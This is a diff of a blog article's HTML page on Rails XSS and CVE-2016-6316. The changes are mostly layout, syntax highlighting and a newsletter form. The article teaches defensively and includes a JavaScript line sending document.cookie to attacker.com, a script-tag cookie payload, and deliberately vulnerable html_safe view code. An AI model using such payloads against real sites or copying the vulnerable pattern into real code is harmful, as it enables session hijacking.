@@ -3,15 +3,16 @@
   <head>
     <meta charset="utf-8">
     <title>Do I really need to patch my Rails apps? (Understanding CVE-2016-6316)</title>
-    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/assets/css/style.css">
   </head>
   <body>
-    <nav>
-      <a href="/">List of Articles</a>
-    </nav>
-    <h1>Do I really need to patch my Rails apps? (Understanding CVE-2016-6316)</h1>
-    <section>
-      <p>Ruby and Rails security advisories, without exception, recommend that you upgrade your Rails app as soon as possible. Unfortunately, the descriptions of the problem being solved can be cryptic, and it can be hard to assess if you really need to do the upgrade. If you’re strapped for time, it can seem like a good plan to postpone upgrades and avoid extra work like fixing breaking tests.</p>
+    <div class="container-lg px-3 my-5 markdown-body">
+      <nav>
+        <a href="/">List of All Articles</a>
+      </nav>
+      <h1>Do I really need to patch my Rails apps? (Understanding CVE-2016-6316)</h1>
+      <section>
+        <p>Ruby and Rails security advisories, without exception, recommend that you upgrade your Rails app as soon as possible. Unfortunately, the descriptions of the problem being solved can be cryptic, and it can be hard to assess if you really need to do the upgrade. If you’re strapped for time, it can seem like a good plan to postpone upgrades and avoid extra work like fixing breaking tests.</p>
 
 <p><strong>Note:</strong> By “upgrade” in this article, we mean a ‘minor’ or a ‘patch’ upgrade. For example an upgrade from Rails <code class="language-plaintext highlighter-rouge">4.2.5.1</code> to <code class="language-plaintext highlighter-rouge">4.2.7.1</code>.</p>
 
@@ -27,8 +28,8 @@
 
 <p>“XSS” stands for cross-site scripting. When your application has an XSS vulnerability, attackers can run malicious Javascript on your users’ browsers. For example, consider a Javascript snippet like the following:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var i = new Image;
-i.src = "http://attacker.com/" + document.cookie;
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">;</span>
+<span class="nx">i</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://attacker.com/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
 </code></pre></div></div>
 
 <p>The above snippet, when run on a user’s browser, will cause the browser to make a request to <code class="language-plaintext highlighter-rouge">attacker.com</code> and send over the user’s cookie. Using this cookie, the attacker can proceed to hijack the user’s session and gain unauthorized access to secured areas of your app.</p>
@@ -63,12 +64,12 @@ i.src = "http://attacker.com/" + document.cookie;
 
 <p>Consider a typical Rails app, with users and admins. A user record has three fields – <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">email</code> and <code class="language-plaintext highlighter-rouge">introduction</code>. Each user has a profile page where this information is listed. Admins in the system, in addition to being able to access these profile pages, also have access to a <code class="language-plaintext highlighter-rouge">/users</code> page which consolidates all the users’ information. The view code for this page starts out looking something like this:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% #This is accessible only to admins %&gt;
-&lt;% User.all.each do |user| %&gt;
-  &lt;%= user.name %&gt;
-  &lt;%= user.email %&gt;
-  &lt;%= user.introduction %&gt;
-&lt;% end %&gt;
+<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;%</span> <span class="c1">#This is accessible only to admins </span><span class="cp">%&gt;</span>
+<span class="cp">&lt;%</span> <span class="no">User</span><span class="p">.</span><span class="nf">all</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">user</span><span class="o">|</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">user</span><span class="p">.</span><span class="nf">name</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">user</span><span class="p">.</span><span class="nf">email</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">user</span><span class="p">.</span><span class="nf">introduction</span> <span class="cp">%&gt;</span>
+<span class="cp">&lt;%</span> <span class="k">end</span> <span class="cp">%&gt;</span>
 </code></pre></div></div>
 
 <p>Now let’s say we want to give our users the ability to customize their introductions with HTML. So instead of typing in <code class="language-plaintext highlighter-rouge">"I'm awesome!!"</code> in the introduction field, they can type in <code class="language-plaintext highlighter-rouge">"I'm &lt;strong&gt;awesome!!&lt;/strong&gt;"</code>. To accomplish this in our view, we make use of the <code class="language-plaintext highlighter-rouge">html_safe</code> helper and change <code class="language-plaintext highlighter-rouge">user.introduction</code> to <code class="language-plaintext highlighter-rouge">user.introduction.html_safe</code>. Now, if a user submits text with HTML in it, our view will render the HTML.</p>
@@ -92,11 +93,11 @@ i.src = "http://attacker.com/" + document.cookie;
 
 <p>Another way using <code class="language-plaintext highlighter-rouge">html_safe</code> can cause XSS vulnerabilities to sneak up on you is when you find yourself needing to incorporate styling on strings which are derived from user input. Going back to our example Rails app’s <code class="language-plaintext highlighter-rouge">/users</code> page, let’s say we’ve installed <a href="http://fontawesome.io/">Font Awesome</a> and we want to provide admins a nicely styled link to a given user’s profile page. We might do something like this in our view:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% User.all.each do |user| %&gt;
-  &lt;%= link_to "&lt;i class='fa fa-user'&gt;&lt;/i&gt; #{user.name}".html_safe, users_profile_path(user) %&gt;
-  &lt;%= user.email %&gt;
-  &lt;%= user.introduction %&gt;
-&lt;% end %&gt;
+<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;%</span> <span class="no">User</span><span class="p">.</span><span class="nf">all</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">user</span><span class="o">|</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">link_to</span> <span class="s2">"&lt;i class='fa fa-user'&gt;&lt;/i&gt; </span><span class="si">#{</span><span class="n">user</span><span class="p">.</span><span class="nf">name</span><span class="si">}</span><span class="s2">"</span><span class="p">.</span><span class="nf">html_safe</span><span class="p">,</span> <span class="n">users_profile_path</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">user</span><span class="p">.</span><span class="nf">email</span> <span class="cp">%&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">user</span><span class="p">.</span><span class="nf">introduction</span> <span class="cp">%&gt;</span>
+<span class="cp">&lt;%</span> <span class="k">end</span> <span class="cp">%&gt;</span>
 </code></pre></div></div>
 
 <p>As in the previous example, this opens our admin’s account up to XSS attacks. By submitting javascript in the <code class="language-plaintext highlighter-rouge">name</code> field, an attacker can proceed to gain access to the admin’s account.</p>
@@ -105,9 +106,8 @@ i.src = "http://attacker.com/" + document.cookie;
 
 <p>The key is to use <code class="language-plaintext highlighter-rouge">html_safe</code> only on trusted strings, because it is an assertion. You can concatenate a string which is <code class="language-plaintext highlighter-rouge">html_safe</code> with a string which is not and be assured that the string which is not <code class="language-plaintext highlighter-rouge">html_safe</code> will be escaped properly. So for example, we can do:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%= link_to "&lt;i class='fa fa-user'&gt;&lt;/i&gt; ".html_safe + "#{user.name}", users_profile_path(user) %&gt;
+<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;%=</span> <span class="n">link_to</span> <span class="s2">"&lt;i class='fa fa-user'&gt;&lt;/i&gt; "</span><span class="p">.</span><span class="nf">html_safe</span> <span class="o">+</span> <span class="s2">"</span><span class="si">#{</span><span class="n">user</span><span class="p">.</span><span class="nf">name</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="n">users_profile_path</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="cp">%&gt;</span>
 </code></pre></div></div>
-
 <p>which will ensure that <code class="language-plaintext highlighter-rouge">user.name</code> is properly escaped. So if we pass in a string like <code class="language-plaintext highlighter-rouge">"Bob Foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> to name, our HTML will look something like:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href='...'&gt;&lt;i class='fa fa-user'&gt;&lt;/i&gt; Bob Foo&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/a&gt;
@@ -208,12 +208,26 @@ i.src = "http://attacker.com/" + document.cookie;
 
 <p><strong><a href="https://ducktypelabs.com/wp-content/uploads/2016/10/Rails_XSS_Security_Cheatsheet.pdf">Click here to download a handy cheatsheet on Rails XSS &amp; Security!</a></strong></p>
 
-<div id="mc_embed_signup" style="background: #dff7fe; padding: 15px;">
-</div>
-
-    </section>
-    <footer>
-      &copy; to me
-    </footer>
+      </section>
+      <section>
+        <!-- Begin Mailchimp Signup Form -->
+        <div id="mc-embed-signup">
+          <form action="https://ducktypelabs.us10.list-manage.com/subscribe/post?u=f8e882c25616e4d0a58a53fc5&amp;id=e880b701c3" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
+              <div id="mc_embed_signup_scroll">
+            <h2 class="py-0 my-0 pb-4">Want to be notified when I publish a new article?</h2>
+            <div class="form-container">
+              <input placeholder="enter email" required type="email" value="" name="EMAIL" class="required email" id="mce-EMAIL">
+              <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button">
+            </div>
+            <div id="mce-responses">
+              <div class="response" id="mce-error-response" style="display:none"></div>
+              <div class="response" id="mce-success-response" style="display:none"></div>
+            </div>    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+            <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_f8e882c25616e4d0a58a53fc5_e880b701c3" tabindex="-1" value=""></div>
+          </form>
+        </div>
+      </section>
+      <footer>© Sid Krishnan</footer>
+    </div>
   </body>
 </html>
